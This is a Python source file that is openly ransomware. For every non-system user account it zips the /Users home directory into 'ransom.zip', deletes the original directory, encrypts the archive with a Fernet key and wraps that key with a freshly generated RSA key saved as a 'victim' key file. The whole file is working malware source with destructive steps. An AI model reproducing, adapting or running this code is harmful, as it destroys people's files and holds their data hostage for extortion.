from pwd import getpwall

from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend as crypto_default_backend
from cryptography.hazmat.primitives.asymmetric.padding import OAEP, MGF1
from cryptography.hazmat.primitives.asymmetric.rsa import generate_private_key
from cryptography.hazmat.primitives.hashes import SHA256
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat, PrivateFormat, NoEncryption

from os import walk
from os.path import join, basename, isdir, abspath
from shutil import rmtree
from zipfile import ZipFile


def zip_directory(path: str) -> str | None:
    # If path doesn't point to a directory, quit immediately
    if not isdir(path):
        print(f'Object at {path} is not a directory.')
        return None

    # Create a ZIP file with the flag ZIP_DEFLATED (8)
    zipped_file_path: str = abspath(join(path, '..', 'ransom.zip'))
    with ZipFile(zipped_file_path, 'w', 8) as zip_file_object:
        for root, _, files in walk(path):
            for file in files:
                zip_file_path: str = join(root, file)
                zip_file_object.write(zip_file_path, basename(zip_file_path))

    # Delete the original directory
    rmtree(path)

    # Return the path of the zipped file
    return zipped_file_path


def encrypt_zip_file(zip_file_path: str, private_key_name: str, victim_key_name: str) -> None:
    # 1. Symmetric encryption of a file
    # Generate a Fernet key
    fernet_key = Fernet.generate_key()
    cipher_suite = Fernet(fernet_key)

    # Read, encrypt and write back the ZIP-ed file contents
    with open(zip_file_path, 'rb') as unencrypted_file:
        unencrypted_file_data = unencrypted_file.read()

    encrypted_file_data = cipher_suite.encrypt(unencrypted_file_data)
    with open(zip_file_path, 'wb') as to_be_encrypted_file:
        to_be_encrypted_file.write(encrypted_file_data)

    # 2. Asymmetric encryption of the Fernet key
    # Generate an RSA key pair
    key_pair = generate_private_key(
        backend=crypto_default_backend(),
        public_exponent=65537,
        key_size=2048
    )
    private_key = key_pair.private_bytes(
        Encoding.PEM,
        PrivateFormat.PKCS8,
        NoEncryption()
    )
    encrypted_fernet_key = key_pair.public_key().encrypt(
        fernet_key,
        OAEP(mgf=MGF1(SHA256()), algorithm=SHA256(), label=None)
    )

    # Store the private and the public-key encrypted Fernet key
    with open(private_key_name, 'wb') as private_key_file:
        private_key_file.write(private_key)
    with open(victim_key_name, 'wb') as victim_key_file:
        victim_key_file.write(encrypted_fernet_key)


if __name__ == '__main__':
    user_directory_candidates = [user.pw_name for user in getpwall() if
                                 not user.pw_name.startswith('_') and user.pw_name not in ['root', 'daemon', 'nobody']]
    for user_directory in user_directory_candidates:
        user_directory_zip_path = zip_directory(f'/Users/{user_directory}')
        encrypt_zip_file(user_directory_zip_path, f'{user_directory}.private.pem', f'{user_directory}.pem')
